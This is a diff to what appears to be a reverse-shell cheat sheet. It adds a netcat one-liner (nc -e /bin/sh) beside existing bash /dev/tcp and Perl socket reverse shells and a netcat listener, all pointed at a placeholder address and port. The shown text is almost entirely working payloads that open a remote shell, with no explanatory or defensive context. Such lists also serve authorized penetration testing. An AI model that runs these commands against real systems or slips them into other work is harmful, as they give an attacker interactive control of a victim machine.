@@ -45,6 +45,11 @@ nc -lvp 8080
 bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
 ```
 
+**Netcat**
+```
+nc -e /bin/sh 127.0.0.1 8080
+```
+
 **Perl**
 ```
 perl -e 'use Socket;$i="127.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
